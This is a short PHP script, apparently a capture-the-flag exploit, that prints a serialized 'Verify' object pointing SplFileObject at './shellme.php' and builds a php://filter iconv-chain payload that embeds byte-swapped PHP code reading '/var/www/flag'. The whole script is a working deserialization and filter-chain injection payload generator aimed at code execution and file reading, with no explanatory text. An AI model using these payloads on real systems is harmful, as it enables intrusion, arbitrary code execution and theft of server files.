<?php
class Verify {
	public $classname = 'SplFileObject';
	public $param = "./shellme.php";
	public $checkMethod;
}

$poc = new Verify();
echo serialize($poc);

$ucscode = iconv("UCS-4LE", "UCS-4BE", "<?php print_r(file_get_contents('/var/www/flag'));?>");
echo "php://filter/convert.iconv.UCS-4LE.UCS-4BE|" . $ucscode . "/resource=z.php";